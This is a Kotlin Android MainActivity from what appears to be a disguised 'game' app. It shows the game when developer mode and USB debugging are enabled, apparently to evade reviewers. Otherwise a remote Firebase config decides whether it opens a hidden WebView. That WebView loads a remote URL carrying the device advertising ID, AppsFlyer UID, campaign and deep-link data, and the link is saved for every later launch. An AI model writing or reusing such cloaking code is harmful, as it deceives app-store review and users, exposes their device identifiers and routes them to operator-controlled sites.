package com.kurs.mon.fin

import android.content.Context
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.provider.Settings
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.kurs.mon.fin.databinding.ActivityMainBinding
import com.kurs.mon.fin.util.*
import com.kurs.mon.fin.util.manager.DataStoreManager
import com.kurs.mon.fin.util.network.internetConnection
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity() {

    companion object {

        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webViewURL = "google.com"

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${internetConnection()}")
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.IO) {
                try {
                    checkDataStore()
                } catch (e: Exception) {
                    log("e: ${e.message}")
                    startFragmentIdFlow.emit(R.id.gameFragment)
                }

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        requestedOrientation = when (fragmentId) {
                            R.id.gameFragment    -> {

//                            binding.root.also { rootCL ->
//                                ConstraintSet().apply {
//                                    clone(rootCL)
//                                    constrainPercentWidth(binding.lottieLoader.id, .2f)
//                                    setHorizontalBias(binding.lottieLoader.id, .9f)
//                                }.applyTo(rootCL)
//                            }
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }
                            R.id.webViewFragment -> {
                                window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }
                            else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        setStartDestination(fragmentId)
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

//    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
//        super.onActivityResult(requestCode, resultCode, data)
//        webViewFragment?.onActivityResult(requestCode, resultCode, data)
//    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Good | link = $it")
                        webViewURL = it
                        startFragmentIdFlow.emit(R.id.webViewFragment)
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Bad")
                    startFragmentIdFlow.emit(R.id.gameFragment)
                }
                else   -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) startFragmentIdFlow.emit(R.id.gameFragment)
                    else try {
                        Firebase.remoteConfig.apply {
                            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val remat = getString("Remat")
                                    log("get success Remat = $remat")
                                    JSONObject(remat).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            dataRemonte(jsonObj.getString("follow"), jsonObj.getBoolean("cheese"), jsonObj.getString("glass"))
                                        }
                                    }

                                } else {
                                    log("fail Remat data = ${this.all}")
                                    startFragmentIdFlow.tryEmit(R.id.gameFragment)
                                }
                            }
                        }
                   } catch (e: Exception) {
                       startFragmentIdFlow.emit(R.id.gameFragment)
                   }
                }
            }
        }
    }

    private suspend fun dataRemonte(follow: String, cheese: Boolean, glass: String) {
        if (cheese) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val faloimitator2000 = follow + "?" +
                            "adr_sit_ing_id=${advertisingId}&" +
                            "appasleruid=${appsflyerUID}&" +
                            "camanign=${AppsflyerUtil.campaignFlow.value}&" +
                            "link_deep=${FacebookUtil.deeplinkFlow.value}"

                    log("falas = $faloimitator2000")

                    webViewURL = faloimitator2000
                    startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                    lottie.hideLoader()

                    coroutine.launch(Dispatchers.IO) {
                        // какоето применение для лишнего параметра (в данном случае comand)
                        DataStoreManager.Key.update { "Good" }
                        if (glass.length != 179) DataStoreManager.Link.update { faloimitator2000 }
                    }
                }

                AppsflyerUtil.initialize(this@MainActivity)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }

                FacebookUtil.initialize()
                coroutine.launch {
                    FacebookUtil.deeplinkFlow.collect {
                        log("deeplinkFlow = $it")
                        if (it != FacebookUtil.DEEPLINK_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
            startFragmentIdFlow.emit(R.id.gameFragment)
        }
    }

    fun isDevMode(context: Context): Boolean {
        return Settings.Secure.getInt(context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
    }

    fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0

}